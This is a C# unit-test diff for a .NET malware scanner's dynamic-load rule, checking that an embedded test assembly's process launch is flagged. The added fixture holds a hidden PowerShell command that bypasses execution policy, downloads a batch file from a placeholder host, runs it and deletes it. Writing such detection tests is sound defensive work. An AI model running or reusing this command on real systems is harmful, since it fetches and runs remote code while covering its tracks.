@@ -66,11 +66,17 @@ public class AssemblyDynamicLoadRuleBranchTests
         _rule.AnalyzeContextualPattern(loadBytes, instructions, 2, new MethodSignals()).ToList();
         var refined = _rule.PostAnalysisRefine(outerModule, Enumerable.Empty<ScanFinding>()).ToList();
 
-        refined.Should().ContainSingle();
-        refined[0].Description.Should().Contain("Embedded assembly");
-        refined[0].Description.Should().Contain(resourceName);
-        refined[0].RiskScore.Should().NotBeNull();
-        refined[0].RiskScore.Should().BeGreaterThan(50);
+        refined.Should().Contain(finding =>
+            finding.RuleId == "AssemblyDynamicLoadRule" &&
+            finding.Description.Contains("Embedded assembly", StringComparison.Ordinal) &&
+            finding.Description.Contains(resourceName, StringComparison.Ordinal) &&
+            finding.RiskScore > 50);
+        refined.Should().Contain(finding =>
+            finding.RuleId == "ProcessStartRule" &&
+            finding.Location.Contains($"Embedded resource '{resourceName}'", StringComparison.Ordinal) &&
+            finding.Description.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
+            finding.Description.Contains("dl.bat", StringComparison.OrdinalIgnoreCase) &&
+            finding.BypassCompanionCheck);
     }
 
     [Fact]
@@ -205,12 +211,63 @@ public class AssemblyDynamicLoadRuleBranchTests
         type.Methods.Add(method);
 
         var il = method.Body.GetILProcessor();
-        il.Append(il.Create(OpCodes.Call, CreateMethodReference("System.Diagnostics", "Process", "Start", module, "System.String")));
+        var processStartInfoType = CreateTypeReference(module, "System.Diagnostics.ProcessStartInfo");
+        il.Append(il.Create(OpCodes.Newobj, CreateConstructor(processStartInfoType, module)));
+        il.Append(il.Create(OpCodes.Dup));
+        il.Append(il.Create(OpCodes.Ldstr, "powershell.exe"));
+        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_FileName", module.TypeSystem.Void, module.TypeSystem.String)));
+        il.Append(il.Create(OpCodes.Dup));
+        il.Append(il.Create(
+            OpCodes.Ldstr,
+            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"iwr 'https://example.invalid/payload.bat' -out $env:TEMP\\dl.bat -useb; if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; Start-Sleep -Seconds 120; Remove-Item $env:TEMP\\dl.bat -Force }\""));
+        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_Arguments", module.TypeSystem.Void, module.TypeSystem.String)));
+        il.Append(il.Create(OpCodes.Dup));
+        il.Append(il.Create(OpCodes.Ldc_I4_1));
+        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_CreateNoWindow", module.TypeSystem.Void, module.TypeSystem.Boolean)));
+        il.Append(il.Create(OpCodes.Call, CreateProcessStartInfoStart(module, processStartInfoType)));
+        il.Append(il.Create(OpCodes.Pop));
         il.Append(il.Create(OpCodes.Ret));
 
         using var ms = new MemoryStream();
         assembly.Write(ms);
         return ms.ToArray();
+    }
+
+    private static MethodReference CreateProcessStartInfoStart(ModuleDefinition module, TypeReference processStartInfoType)
+    {
+        var processType = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var processStart = new MethodReference("Start", processType, processType)
+        {
+            HasThis = false
+        };
+        processStart.Parameters.Add(new ParameterDefinition(processStartInfoType));
+        return processStart;
+    }
+
+    private static MethodReference CreateConstructor(TypeReference declaringType, ModuleDefinition module)
+    {
+        return new MethodReference(".ctor", module.TypeSystem.Void, declaringType)
+        {
+            HasThis = true
+        };
+    }
+
+    private static MethodReference CreateInstanceMethod(
+        TypeReference declaringType,
+        string methodName,
+        TypeReference returnType,
+        params TypeReference[] parameterTypes)
+    {
+        var method = new MethodReference(methodName, returnType, declaringType)
+        {
+            HasThis = true
+        };
+        foreach (var parameterType in parameterTypes)
+        {
+            method.Parameters.Add(new ParameterDefinition(parameterType));
+        }
+
+        return method;
     }
 
     private static global::System.Reflection.MethodInfo GetPrivateStaticMethod(string name)
